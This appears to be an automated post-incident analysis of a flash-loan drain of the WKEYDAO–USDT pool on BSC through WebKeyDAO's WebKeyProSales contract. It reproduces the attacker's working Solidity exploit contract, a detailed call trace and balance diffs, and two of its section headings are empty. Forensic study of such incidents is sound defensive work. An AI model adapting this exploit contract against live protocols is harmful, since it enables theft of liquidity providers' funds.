# Flash-loan-assisted drain of WKEYDAO–USDT liquidity via WebKeyProSales

**Protocol:** WebKeyDAO (WKEYDAO)
**Root Cause Category:** protocol_bug

## ACT Opportunity & Exploit Predicate

- **Block height B:** 47468890
- **Pre-state σ_B definition:** BSC chain pre-state immediately before block 47468890, including deployed contracts DODOFlashloan 0x3783c9..., WKEYDAO token 0x194b30..., WebKeyProSales proxy 0xd51109..., FeeReceiverV2 proxy 0x1E92d4..., DODO DVM pool 0x107f3b..., and the WKEYDAO–USDT PancakePair 0x8665a7..., with their publicly reconstructible balances and storage as implied by prior on-chain history.

**Pre-state evidence references:**
- artifacts/root_cause/seed/index.json
- artifacts/root_cause/seed/56/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8/metadata.json
- artifacts/root_cause/data_collector/iter_1/address/56/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32/txlist.json
- artifacts/root_cause/data_collector/iter_1/address/56/0x107f3be24e3761a91322aa4f5f54d9f18981530c/txlist.json
- artifacts/root_cause/data_collector/iter_1/address/56/0x8665a78ccc84d6df2acaa4b207d88c6bc9b70ec5/txlist.json

### Transaction Sequence B

- **Index 1 (chain 56):** tx 0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8 (adversary-crafted)
  - Inclusion feasibility: Any unprivileged BSC EOA can call DODOFlashloan::wheeaappP on 0x3783c9... with arbitrary arguments, providing standard gas and fee payments. The function performs a DODO V2 flash loan from pool 0x107f3b..., then within the callback repeatedly calls the public buy() entrypoint of WebKeyProSales (via proxy 0xd51109...), uses PancakeRouter and the WKEYDAO–USDT pair 0x8665a7... to swap minted WKEYDAO to USDT, repays the flash loan, and finally transfers all remaining USDT to the hard-coded beneficiary 0x3026c4.... The seed tx shows exactly such a call from 0x3026c4... with no special privileges, so the sequence is feasible for any adversary controlling 0x3026c4... or an equivalent EOA.
  - Notes: This single tx suffices to realize the exploit predicate: the adversary can construct and sign the call data for wheeaappP using only public contract ABIs and on-chain state, and the resulting execution deterministically drains USDT from the WKEYDAO–USDT pool into adversary-controlled balances while repaying the flash loan.

### Exploit Predicate

- **Type:** profit
- **Profit details:**
  - Reference asset: USD
  - Adversary address: 0x3026c464d3bd6ef0ced0d49e80f171b58176ce32
  - Fees paid (ref asset): unknown
  - Value before (ref asset): unknown
  - Value after (ref asset): unknown
  - Value delta (ref asset): positive (net +7.37321043501382964470008e23 BEP20USDT units minus transaction gas costs)
  - Valuation notes: BEP20USDT (0x55d398326f99059ff775485246999027b3197955) on BSC is a USD-pegged stablecoin and is used as the reference asset. The seed tx balance_diff.json shows that holder 0x3026c4... has its USDT balance increased from 9.53324699142e11 to 7.37321043502336289169150e23 units (delta 7.37321043501382964470008e23) in this tx, while the native BNB balance of 0x3026c4... decreases by 8.5138569e16 wei due to gas. The DODO DVM pool's USDT balance returns to its pre-tx level after repayment, and the WKEYDAO–USDT PancakePair loses 8.40208552423193448385644e23 USDT and gains WKEYDAO. Because the adversary gains a very large amount of liquid USDT in a single tx, and gas costs (paid in BNB) are negligible relative to this USDT delta, the adversary's net portfolio value in USD strictly increases after fees.

## Incident Overview & TL;DR

**Incident brief.** On BSC, an adversary-controlled EOA 0x3026c4... used a custom DODOFlashloan helper contract to borrow 1.2e21 USDT from a DODO V2 pool, route that USDT through the WebKeyDAO WebKeyProSales and FeeReceiverV2 contracts, and repeatedly sell freshly minted WKEYDAO tokens against the WKEYDAO–USDT PancakePair. The combined sale, fee, and swap logic deterministically drained more USDT from the WKEYDAO–USDT pool than was required to repay the flash loan, with the surplus funneled into the adversary's address and a small set of reward recipients.

**Root cause brief.** The WebKeyDAO tokenomics and sale pipeline (WebKeyProSales + FeeReceiverV2 + WKEYDAO fee-on-transfer token) allowed an unbounded sequence of flash-loan-funded buy() calls to mint WKEYDAO cheaply and repeatedly swap it against the WKEYDAO–USDT liquidity pool without sufficient pricing or slippage safeguards, enabling a single public transaction through DODOFlashloan to extract a large amount of USDT from the pool for the benefit of 0x3026c4....

## Key Background

## Vulnerability & Root Cause Analysis

## Adversary Flow Analysis

**Adversary strategy summary.** The adversary deployed or used a specialized DODOFlashloan helper that can call WebKeyDAO's sale contracts from within a flash-loan callback, configured it to use the WebKeyProSales and FeeReceiverV2 proxies and the WKEYDAO–USDT liquidity pool, and executed a single large wheeaappP transaction that iterated the buy-and-sell cycle many times, draining USDT from the pool into 0x3026c4... and a small set of reward recipients, after which the adversary used Uniswap's UniversalRouter to rebalance the acquired USDT.

### Adversary-Related Accounts

- **Address:** 0x3026c464d3bd6ef0ced0d49e80f171b58176ce32 (chain BSC, id 56)
  - EOA: true | Contract: false
  - Reason: Sender of the adversary-crafted seed tx 0xc9bc...d4c8, hard-coded beneficiary in DODOFlashloan::_flashLoanCallBack, and immediate recipient of the largest USDT balance increase (+7.37321043501382964470008e23) in balance_diff.json.
- **Address:** 0x3783c91ee49a303c17c558f92bf8d6395d2f76e3 (chain BSC, id 56)
  - EOA: false | Contract: true
  - Reason: DODOFlashloan helper contract used exclusively by the adversary-crafted tx to perform the DODO flash loan, orchestrate repeated WebKeyProSales::buy() calls, and transfer all residual USDT to 0x3026c4...; code is tailored to this exploit pattern.

### Victim Candidates

- **WKEYDAO–USDT PancakePair:** 0x8665a78ccc84d6df2acaa4b207d88c6bc9b70ec5 on BSC (chainid 56), verified: unknown
- **WebKeyProSales proxy:** 0xd511096a73292a7419a94354d4c1c73e8a3cd851 on BSC (chainid 56), verified: true
- **FeeReceiverV2 proxy:** 0x1E92d477473295E9f3B0f630f010b4EF8658dA94 on BSC (chainid 56), verified: true
- **WKEYDAO token:** 0x194b302a4b0a79795fb68e2adf1b8c9ec5ff8d1f on BSC (chainid 56), verified: true
- **BEP20USDT (USDT on BSC):** 0x55d398326f99059ff775485246999027b3197955 on BSC (chainid 56), verified: true

### Adversary Lifecycle Stages

#### Adversary preparation & funding

**Relevant transactions:**
- BSC chain (id 56), tx 0x4bcc7b3747920e15e0503885d6048c230fa6dccf149f3110d72f71c713ad9744, block 47469092 (mechanism: swap)
- BSC chain (id 56), tx 0x83ef55cf1590c413d9327bc79b42d19b45b0a97e975489e264f9525fdf6218fc, block 47469157 (mechanism: swap)

**Effect.** EOA 0x3026c4... maintains sufficient BNB to pay gas and uses Uniswap UniversalRouter with Permit2 to establish high USDT allowances and to swap between USDT and another BEP20 token around the incident window. These swaps adjust the adversary's asset mix but are not necessary for the core exploit; they demonstrate that 0x3026c4... is an active trading EOA able to move large USDT positions through public routers.

**Code/trace evidence references:**
- artifacts/root_cause/data_collector/iter_3/tx/56/0x4bcc7b3747920e15e0503885d6048c230fa6dccf149f3110d72f71c713ad9744/trace.cast.log; artifacts/root_cause/data_collector/iter_3/tx/56/0x83ef55cf1590c413d9327bc79b42d19b45b0a97e975489e264f9525fdf6218fc/trace.cast.log.

#### Flash-loan-backed WebKeyProSales exploitation

**Relevant transactions:**
- BSC chain (id 56), tx 0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8, block 47468890 (mechanism: flashloan)

**Effect.** 0x3026c4... calls DODOFlashloan::wheeaappP on 0x3783c9..., which borrows 1.2e21 USDT from DVM pool 0x107f3b..., sets Buyer=0xd51109... and Token=WKEYDAO, and in the flash-loan callback loops WebKeyProSales::buy() and PancakeRouter swaps. Each loop transfers a fixed 1.159e21 USDT from DODOFlashloan to the sales proxy, mints WKEYDAO, sends fee WKEYDAO to FeeReceiverV2, swaps FeeReceiverV2's WKEYDAO fee for USDT and distributes it to configured recipients, and swaps DODOFlashloan's WKEYDAO balance for USDT from the WKEYDAO–USDT pair. After the loop, DODOFlashloan repays the 1.2e21 USDT loan to the DVM pool and transfers its remaining USDT (roughly 7.373e23 units) to 0x3026c4.... The WKEYDAO–USDT pair loses 8.402e23 USDT and gains 1.541e13 WKEYDAO, evidencing a net drain of USDT liquidity into the adversary and reward recipients.

**Code/trace evidence references:**
- DODOFlashloan source at artifacts/root_cause/data_collector/iter_1/contract/56/0x3783c91ee49a303c17c558f92bf8d6395d2f76e3/source/src/Contract.sol; structured trace at artifacts/root_cause/data_collector/iter_3/tx/56/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8/trace.cast.log; balance diffs at artifacts/root_cause/seed/56/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8/balance_diff.json.

#### Post-exploit portfolio rebalancing

**Relevant transactions:**
- BSC chain (id 56), tx 0x4bcc7b3747920e15e0503885d6048c230fa6dccf149f3110d72f71c713ad9744, block 47469092
- BSC chain (id 56), tx 0x83ef55cf1590c413d9327bc79b42d19b45b0a97e975489e264f9525fdf6218fc, block 47469157

**Effect.** Immediately after the exploit tx, 0x3026c4... uses Uniswap UniversalRouter and Permit2 to swap a large portion of the acquired USDT through Pancake V3 pools, receiving another BEP20 token (via BEP20TokenImplementation::transfer from pool 0x92b7807bF19b7DDdf89b706143896d05228f3121). These txs consume the USDT obtained in the exploit and demonstrate adversary control over the funds, but they do not affect the exploit's net profit relative to the pre-tx state.

**Code/trace evidence references:**
- artifacts/root_cause/data_collector/iter_3/tx/56/0x4bcc7b3747920e15e0503885d6048c230fa6dccf149f3110d72f71c713ad9744/trace.cast.log; artifacts/root_cause/data_collector/iter_3/tx/56/0x83ef55cf1590c413d9327bc79b42d19b45b0a97e975489e264f9525fdf6218fc/trace.cast.log.

## Impact & Loss Analysis

**Attacker profit summary.** In tx 0xc9bc...d4c8, EOA 0x3026c4... receives a net increase of 7.37321043501382964470008e23 BEP20USDT units, as measured by balance_diff.json, while re-paying a 1.2e21 USDT flash loan and paying approximately 8.5138569e16 wei of BNB as gas. Subsequent swaps in txs 0x4bcc7b... and 0x83ef55... convert a large fraction of this USDT into another BEP20 token via Pancake V3 pools but do not reduce the adversary's net value; they simply change its composition.

**Pool / protocol loss overview:**
- Token USDT: loss amount 840208552423193448385644

**Impacts.** The WKEYDAO–USDT PancakePair 0x8665a7... experiences a loss of 8.40208552423193448385644e23 USDT and an increase of 1.541e13 WKEYDAO, as recorded in balance_diff.json and confirmed by Sync/Swap events in the seed tx trace. This represents a substantial drain of USDT liquidity from the pool into the adversary-controlled EOA 0x3026c4... and several reward recipients. The DODO DVM pool used for the flash loan ends the tx with its USDT balance restored, indicating that the loss is localized to the WKEYDAO–USDT pool and, by extension, to LPs or protocol-owned liquidity in that pool.

## References

**Artifact and trace references:**
- [1]: Seed tx metadata, receipt, and balance diffs for 0xc9bc...d4c8 — artifacts/root_cause/seed/56/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8/
- [2]: DODOFlashloan verified source — artifacts/root_cause/data_collector/iter_1/contract/56/0x3783c91ee49a303c17c558f92bf8d6395d2f76e3/source/src/Contract.sol
- [3]: Structured trace for exploit tx 0xc9bc...d4c8 — artifacts/root_cause/data_collector/iter_3/tx/56/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8/trace.cast.log
- [4]: Structured traces for post-exploit swaps 0x4bcc...9744 and 0x83ef...18fc — artifacts/root_cause/data_collector/iter_3/tx/56/
- [5]: Data Collector summary of fetched artifacts — artifacts/root_cause/data_collector/data_collection_summary.json

## Key Code and Trace Snippets

**DODOFlashloan flash-loan callback and loop (verified contract source).**

Origin: Verified DODOFlashloan contract on BSC used in the exploit transaction.

```solidity
uint256 Am4;
IERC20 Usdt = IERC20(usdt);



    function wheeaappP(
        address flashLoanPool, //You will make a flashloan from this DODOV2 pool
        uint256 loanAmount, 
        address loanToken,
        address token
      ,uint256 am1,
       address buyer
    ) external payable  {
   Buyer= buyer;
     Am1=am1;
     Token=token;

        //Note: The data can be structured with any variables required by your logic. The following code is just an example
        bytes memory data = abi.encode(flashLoanPool, loanToken, loanAmount);
        address flashLoanBase = IDODO(flashLoanPool)._BASE_TOKEN_();
        if(flashLoanBase == loanToken) {
            IDODO(flashLoanPool).flashLoan(loanAmount, 0, address(this), data);
        } else {
            IDODO(flashLoanPool).flashLoan(0, loanAmount, address(this), data);
        }
    }

    //Note: CallBack function executed by DODOV2(DVM) flashLoan pool
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    //Note: CallBack function executed by DODOV2(DPP) flashLoan pool
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    //Note: CallBack function executed by DODOV2(DSP) flashLoan pool
    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        //IERC20(Token).balanceOf(address(this))
        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.decode(data, (address, address, uint256));
        address[] memory Path = new address[](2);
        Path[0] = Token;
        Path[1] = usdt; 
   IERC20(usdt).approve(Buyer,10000000000000 ether);
 IERC20(Token).approve(router,10000000000000 ether);
       for (uint256 i=0; i<Am1; i++){
    Imig(Buyer).buy();
uint256 sell =  IERC20(Token).balanceOf(address(this));
 IUniswapV2Router02(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(sell,1,Path,address(this),89218399213893);
    }
    
     
 


        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
     IERC20(loanToken).transfer(0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32,IERC20(usdt).balanceOf(address(this)));
      
    }
     function withdraw(address _token, uint256 _amount) external {
```

_Caption: The helper contract exposes `wheeaappP`, stores the buyer, token, and loop count `Am1`, then in `_flashLoanCallBack` loops `buy()` and swaps all WKEYDAO for USDT before repaying the loan and sending residual USDT to 0x3026c4..._.

**Seed transaction trace for exploit tx 0xc9bc...d4c8.**

Origin: Structured call trace of the adversary-crafted exploit transaction.

```text
Executing previous transactions from the block.
Traces:
  [31873935] DODOFlashloan::wheeaappP(0x107F3Be24e3761A91322AA4f5F54D9f18981530C, 1200000000000000000000 [1.2e21], BEP20USDT: [0x55d398326f99059fF775485246999027B3197955], WKEYDAO: [0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F], 67, TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851])
    ├─ [5126] 0x107F3Be24e3761A91322AA4f5F54D9f18981530C::_BASE_TOKEN_() [staticcall]
    │   ├─ [2460] 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9::_BASE_TOKEN_() [delegatecall]
    │   │   └─ ← [Return] 0x000000000000000000000000591aaadbc85e19065c88a1b0c2ed3f58295f47df
    │   └─ ← [Return] 0x000000000000000000000000591aaadbc85e19065c88a1b0c2ed3f58295f47df
    ├─ [31796092] 0x107F3Be24e3761A91322AA4f5F54D9f18981530C::flashLoan(0, 1200000000000000000000 [1.2e21], DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], 0x000000000000000000000000107f3be24e3761a91322aa4f5f54d9f18981530c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000410d586a20a4c00000)
    │   ├─ [31795881] 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9::flashLoan(0, 1200000000000000000000 [1.2e21], DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], 0x000000000000000000000000107f3be24e3761a91322aa4f5f54d9f18981530c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000410d586a20a4c00000) [delegatecall]
    │   │   ├─ [29971] BEP20USDT::transfer(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], 1200000000000000000000 [1.2e21])
    │   │   │   ├─ emit Transfer(from: 0x107F3Be24e3761A91322AA4f5F54D9f18981530C, to: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], value: 1200000000000000000000 [1.2e21])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x9685f7a78cb2e45ed4ca95db7830a3bffc66ac3a871c4b2d7fc83068cdb1af12: 0x0000000000000000000000000000000000000000000006aadac4531299112cbe → 0x000000000000000000000000000000000000000000000669cd6be8f1f4512cbe
    │   │   │   │   @ 0x3988d59a6ea6c67a33ec9e08435f8fb2578b4b0e53acd5b381a83cb563c354a0: 0 → 0x0000000000000000000000000000000000000000000000410d586a20a4c00000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [31739034] DODOFlashloan::DVMFlashLoanCall(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], 0, 1200000000000000000000 [1.2e21], 0x000000000000000000000000107f3be24e3761a91322aa4f5f54d9f18981530c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000410d586a20a4c00000)
    │   │   │   ├─ [24562] BEP20USDT::approve(TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], 10000000000000000000000000000000 [1e31])
    │   │   │   │   ├─ emit Approval(owner: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], spender: TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], value: 10000000000000000000000000000000 [1e31])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xfb93e514c1e113a5c156b0896db9038f136cc977d5166212978ec4d950b47a63: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [24559] WKEYDAO::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 10000000000000000000000000000000 [1e31])
    │   │   │   │   ├─ emit Approval(owner: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 10000000000000000000000000000000 [1e31])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x02aab0a4d98e1ab7e66c8eec36cc363f2244aa89fd97239bea92a5bb8ea4e0c5: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531761] TransparentUpgradeableProxy::fallback()
    │   │   │   │   ├─ [524607] WebKeyProSales::buy() [delegatecall]
    │   │   │   │   │   ├─ [27934] BEP20USDT::transferFrom(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], 1159000000000000000000 [1.159e21])
    │   │   │   │   │   │   ├─ emit Transfer(from: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], to: TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], value: 1159000000000000000000 [1.159e21])
    │   │   │   │   │   │   ├─ emit Approval(owner: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], spender: TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], value: 9999999998841000000000000000000 [9.999e30])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0x3988d59a6ea6c67a33ec9e08435f8fb2578b4b0e53acd5b381a83cb563c354a0: 0x0000000000000000000000000000000000000000000000410d586a20a4c00000 → 0x00000000000000000000000000000000000000000000000238fd42c5cf040000
    │   │   │   │   │   │   │   @ 0xfb93e514c1e113a5c156b0896db9038f136cc977d5166212978ec4d950b47a63: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000 → 0x000000000000000000000000000000000000007e37be1fe3ec3623cbaa440000
    │   │   │   │   │   │   │   @ 0x53a005fec467996be496b3e96688bcf41c25d87f297951397d1de3cae243970f: 0 → 0x00000000000000000000000000000000000000000000003ed45b275ad5bc0000
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [0] console::log("to get nextTokenId") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [2344] 0xC1ee50b36305F3f28958617f82F4235224D97690::nextTokenId() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    │   │   │   │   │   ├─ [0] console::log("to mint") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [197653] 0xC1ee50b36305F3f28958617f82F4235224D97690::mint(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3])
    │   │   │   │   │   │   ├─ [0] console::log("mint to", DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], param2: 1000)
    │   │   │   │   │   │   ├─ [1349] DODOFlashloan::onERC721Received(TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], 0x0000000000000000000000000000000000000000, 1000, 0x)
    │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 2: 0 → 1
    │   │   │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf: 0 → 0x0000000000000000000000003783c91ee49a303c17c558f92bf8d6395d2f76e3
    │   │   │   │   │   │   │   @ 0xb32538cb5e6e8a422878be1e651af94e18104f367698843e4714371969d27c03: 0 → 1000
    │   │   │   │   │   │   │   @ 0xaec8f5eb87c3b4a31610653af6777e9503fb596b56c358344b036afdc05baec3: 0 → 1
    │   │   │   │   │   │   │   @ 0x317ab1663b160b40d49b8a30e93ad1af83f4c85a9695e8bb150270b2357b3b2b: 0 → 6000
    │   │   │   │   │   │   │   @ 11: 1000 → 1001
    │   │   │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0 → 1000
    │   │   │   │   │   │   │   @ 0x3988d59a6ea6c67a33ec9e08435f8fb2578b4b0e53acd5b381a83cb563c354a0: 0 → 1
    │   │   │   │   │   │   │   @ 0xedd2ba9ce79c740d3994964514f5294f1af049cc72037868401ffe48d4e71f3d: 0 → 1
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [0] console::log("to transfer immediateTokens") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [0] console::log("to mint wkey") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [34409] WKEYDAO::mint(TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], 230000000000 [2.3e11])
    │   │   │   │   │   │   ├─ emit Transfer(from: WKEYDAO: [0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F], to: TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], value: 230000000000 [2.3e11])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0xd6cf8be9aee2d5e15968e8d4507c4927b247135febd13306031495b0bd969e36: 0 → 0x000000000000000000000000000000000000000000000000000000358d117c00
    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000000008c31e93b00f52 → 0x0000000000000000000000000000000000000000000000000008c35420c18b52
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [0] console::log("to transfer wkey") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [27647] WKEYDAO::transfer(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], 230000000000 [2.3e11])
    │   │   │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0xD511096a73292A7419a94354d4C1C73e8a3CD851], to: DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3], value: 230000000000 [2.3e11])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0xd6cf8be9aee2d5e15968e8d4507c4927b247135febd13306031495b0bd969e36: 0x000000000000000000000000000000000000000000000000000000358d117c00 → 0
    │   │   │   │   │   │   │   @ 0xbb2c94b7f8d287c8efa55b37d01f619a0708f018818090d542c19e9555bfa39f: 0 → 0x000000000000000000000000000000000000000000000000000000358d117c00
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [9726] TransparentUpgradeableProxy::fallback(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3]) [staticcall]
    │   │   │   │   │   │   ├─ [2566] Community::referrerOf(DODOFlashloan: [0x3783c91eE49A303c17C558F92bf8d6395d2f76E3]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
```

_Caption: Shows DODOFlashloan::wheeaappP calling the DODO V2 DVM flashLoan, WebKeyProSales::buy(), WKEYDAO minting and transfers, and PancakeRouter swaps against the WKEYDAO–USDT pair within a single transaction_.

**Balance diffs for exploit tx 0xc9bc...d4c8 (USDT and WKEYDAO).**

Origin: Pre/post ERC-20 balance diff for the seed exploit transaction.

```json
{
  "erc20_balance_deltas": [
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0x8665a78ccc84d6df2acaa4b207d88c6bc9b70ec5",
      "before": "11295783367546335705988826",
      "after": "10455574815123142257603182",
      "delta": "-840208552423193448385644",
      "balances_slot": "1",
      "slot_key": "0x35aeed7c9dd7e1a7c5c33a3671a96a7bdf4f0654a8d186dc58392d1aeb5e1489",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0xb63f6fe69dcaa4ec43903067ef2545edcb4b6ca7",
      "before": "142285299541510124375050",
      "after": "147332201325872221158173",
      "delta": "5046901784362096783123",
      "balances_slot": "1",
      "slot_key": "0xbdbd637e3e4fd7ff2fba3ce44eec485f5c38cd6253c299746d62afca250516f5",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0xcd62464874ea7859ccea96dfcfc0a067a2ab454d",
      "before": "1686239117218532505291022",
      "after": "1693809469895075650465717",
      "delta": "7570352676543145174695",
      "balances_slot": "1",
      "slot_key": "0x1792bf1143dd9bc40ce594ebaf49308dc41ded40ae6a007338c1e82cc9b770af",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0xf1988dee95c442f5af97c25b4b7de4ce330816a4",
      "before": "468775255643427884329761",
      "after": "473822157427789981112884",
      "delta": "5046901784362096783123",
      "balances_slot": "1",
      "slot_key": "0x574e4dcf8b5f8a0eb9997b56057338686ff47df50d914d4bb6ea66a2724b510f",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0x9a32fa1f75cb9d32142164343d75ed5ba3d629bf",
      "before": "1686239117218532505291022",
      "after": "1693809469895075650465717",
      "delta": "7570352676543145174695",
      "balances_slot": "1",
      "slot_key": "0x048c3824a280dafd7d113656ab38cecc81c42de8f4f9015e638204580fe64672",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x55d398326f99059ff775485246999027b3197955",
      "holder": "0x3026c464d3bd6ef0ced0d49e80f171b58176ce32",
      "before": "953324699142",
      "after": "737321043502336289169150",
      "delta": "737321043501382964470008",
      "balances_slot": "1",
      "slot_key": "0x87c83e759d7b138d17b0e45f5f685f0c63524d86ad54e2a2f032a714b034a9ee",
      "contract_name": "BEP20USDT"
    },
    {
      "token": "0x194b302a4b0a79795fb68e2adf1b8c9ec5ff8d1f",
      "holder": "0x8665a78ccc84d6df2acaa4b207d88c6bc9b70ec5",
      "before": "191264498246382",
      "after": "206674498246382",
      "delta": "15410000000000",
      "balances_slot": "0",
      "slot_key": "0x13aff5b8749df45e0f1a8add0c4f9caae4b9236ca94dbc63fd0be4665add785e",
      "contract_name": "WKEYDAO"
    }
  ]
}
```

_Caption: Confirms that the WKEYDAO–USDT pair loses ~8.402e23 USDT while 0x3026c4... gains ~7.373e23 USDT and several reward addresses receive smaller USDT amounts, consistent with the described drain of LP liquidity._

## All Relevant Transactions

- Chainid 56, tx 0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8, role: attacker-crafted
- Chainid 56, tx 0x4bcc7b3747920e15e0503885d6048c230fa6dccf149f3110d72f71c713ad9744, role: related
- Chainid 56, tx 0x83ef55cf1590c413d9327bc79b42d19b45b0a97e975489e264f9525fdf6218fc, role: related
